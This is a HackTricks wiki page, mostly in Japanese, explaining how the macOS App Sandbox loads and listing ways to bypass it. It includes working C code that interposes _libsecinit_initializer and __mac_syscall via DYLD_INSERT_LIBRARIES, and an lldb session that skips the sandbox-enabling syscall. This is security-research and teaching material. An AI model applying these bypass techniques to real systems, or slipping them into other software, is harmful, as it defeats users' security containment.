# macOS Sandbox Debug & Bypass

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

## Sandbox loading process

<figure><img src="../../../../../.gitbook/assets/image (901).png" alt=""><figcaption><p>Image from <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

前の画像では、**`com.apple.security.app-sandbox`** の権限を持つアプリケーションが実行されるときに**サンドボックスがどのように読み込まれるか**を観察できます。

コンパイラはバイナリに `/usr/lib/libSystem.B.dylib` をリンクします。

その後、**`libSystem.B`** は他のいくつかの関数を呼び出し、**`xpc_pipe_routine`** がアプリの権限を **`securityd`** に送信します。Securitydはプロセスがサンドボックス内で隔離されるべきかどうかを確認し、そうであれば隔離します。\
最後に、サンドボックスは **`__sandbox_ms`** への呼び出しでアクティブ化され、これが **`__mac_syscall`** を呼び出します。

## Possible Bypasses

### Bypassing quarantine attribute

**サンドボックス化されたプロセスによって作成されたファイル**には、サンドボックスからの脱出を防ぐために**隔離属性**が追加されます。しかし、もしあなたが**隔離属性なしで `.app` フォルダを作成することができれば**、アプリバンドルのバイナリを **`/bin/bash`** にポイントさせ、**plist** にいくつかの環境変数を追加して **`open`** を悪用し、**新しいアプリをサンドボックスなしで起動する**ことができます。

これは [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)** で行われたことです。**

{% hint style="danger" %}
したがって、現時点では、**隔離属性なしで `.app`** で終わる名前のフォルダを作成できる場合、サンドボックスから脱出できます。なぜなら、macOSは**`.app` フォルダ**と**メイン実行可能ファイル**の**隔離**属性のみを**チェック**するからです（そして、私たちはメイン実行可能ファイルを **`/bin/bash`** にポイントさせます）。

すでに実行を許可された .app バンドル（実行を許可されたフラグが付いた隔離 xttrを持つ）であれば、それを悪用することもできます... ただし、今はサンドボックス内では特権TCC権限がない限り、**`.app`** バンドル内に書き込むことはできません。
{% endhint %}

### Abusing Open functionality

[**Wordサンドボックスバイパスの最後の例**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)では、**`open`** CLI機能がサンドボックスをバイパスするために悪用される様子が見られます。

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Launch Agents/Daemons

アプリケーションが**サンドボックス化されることを意図している**場合（`com.apple.security.app-sandbox`）、例えば**LaunchAgent**（`~/Library/LaunchAgents`）から実行されると、サンドボックスをバイパスすることが可能です。\
[**この投稿**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)で説明されているように、サンドボックス化されたアプリケーションで永続性を得たい場合、LaunchAgentとして自動的に実行されるようにし、DyLib環境変数を介して悪意のあるコードを注入することができます。

### Abusing Auto Start Locations

サンドボックス化されたプロセスが**後でサンドボックスなしのアプリケーションがバイナリを実行する場所に**書き込むことができる場合、**そこにバイナリを置くだけで**脱出できます。この種の場所の良い例は `~/Library/LaunchAgents` や `/System/Library/LaunchDaemons` です。

これには**2ステップ**が必要な場合があります：**より許可されたサンドボックス**（`file-read*`, `file-write*`）を持つプロセスを実行し、実際に**サンドボックスなしで実行される場所に**書き込むコードを実行します。

**自動起動場所**についてのこのページを確認してください：

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Abusing other processes

サンドボックスプロセスから**他のプロセスを妥協する**ことができれば、より制限の少ないサンドボックス（またはサンドボックスなし）で実行されているプロセスに脱出できます：

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Static Compiling & Dynamically linking

[**この研究**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)では、サンドボックスをバイパスする2つの方法が発見されました。サンドボックスはユーザーランドから適用され、**libSystem**ライブラリが読み込まれるときに適用されます。バイナリがそれを読み込むのを回避できれば、サンドボックス化されることはありません：

* バイナリが**完全に静的にコンパイルされている**場合、そのライブラリを読み込むのを回避できます。
* **バイナリがライブラリを読み込む必要がない**場合（リンカーもlibSystemにあるため）、libSystemを読み込む必要はありません。

### Shellcodes

**シェルコード**でさえ、ARM64では `libSystem.dylib` にリンクする必要があることに注意してください：
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Entitlements

特定の**権限**を持つアプリケーションの場合、いくつかの**アクション**が**サンドボックスによって許可される**ことに注意してください。
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

**Interposting**に関する詳細は以下を参照してください：

{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
{% endcontent-ref %}

#### サンドボックスを防ぐために `_libsecinit_initializer` をインターポストする
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### サンドボックスを防ぐための `__mac_syscall` のインターポーズ

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debug & bypass Sandbox with lldb

サンドボックス化されるべきアプリケーションをコンパイルしましょう：

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="entitlements.xml" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% endtab %}

{% tab title="Info.plist" %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

次にアプリをコンパイルします：

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
アプリは **`~/Desktop/del.txt`** ファイルを **読み取ろう** としますが、**Sandboxはそれを許可しません**。\
Sandboxがバイパスされると、そこにファイルを作成すると読み取れるようになります:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

アプリケーションをデバッグして、Sandboxがいつロードされるかを確認しましょう:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**サンドボックスがバイパスされても、TCC** はユーザーにデスクトップからファイルを読み取るプロセスを許可するかどうか尋ねます
{% endhint %}

## 参考文献

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)
{% hint style="success" %}
AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
</details>
{% endhint %}
